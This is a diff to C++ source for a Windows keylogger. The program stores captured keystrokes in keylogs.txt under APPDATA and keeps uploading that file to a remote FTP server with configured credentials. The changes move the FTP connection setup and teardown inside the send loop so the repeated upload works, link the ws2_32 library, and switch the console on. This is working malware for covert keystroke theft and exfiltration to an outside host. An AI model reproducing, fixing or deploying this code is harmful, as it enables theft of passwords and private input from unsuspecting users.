@@ -5,6 +5,7 @@
 #include <wininet.h>
 #include <thread>
 #include <fstream>
+#pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib, "Wininet")
 using namespace std;
 
@@ -17,7 +18,7 @@ const string FILE_NAME = "keylogs.txt";
 const string LOGS_FILE_PATH = string(getenv("APPDATA")) + "\\" + FILE_NAME;
 
 // determines if the console is displayed or not (off=default)
-bool noConsole = true;
+bool noConsole = false;
 
 // send delay of which when the key logs file is sent to the server (measured: milliseconds)
 const int DELAY = 5000;
@@ -451,13 +452,18 @@ bool CaptureKeys(int key)
 
 void FTP_SendLogs()
 {
-    // connect to FTP server
-    HINTERNET InternetConnection = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    HINTERNET ftpSession = InternetConnectA(InternetConnection, FTP_SERVER.data(), INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME.data(), FTP_PASSWORD.data(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
-
     while (true)
     {
+        // connect to FTP server
+        HINTERNET InternetConnection = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+        HINTERNET ftpSession = InternetConnectA(InternetConnection, FTP_SERVER.data(), INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME.data(), FTP_PASSWORD.data(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
+
+        // upload file
         FtpPutFileA(ftpSession, LOGS_FILE_PATH.data(), FILE_NAME.data(), FTP_TRANSFER_TYPE_BINARY, 0);
+
+        InternetCloseHandle(InternetConnection);
+        InternetCloseHandle(ftpSession);
+
         Sleep(DELAY);
     }
 }
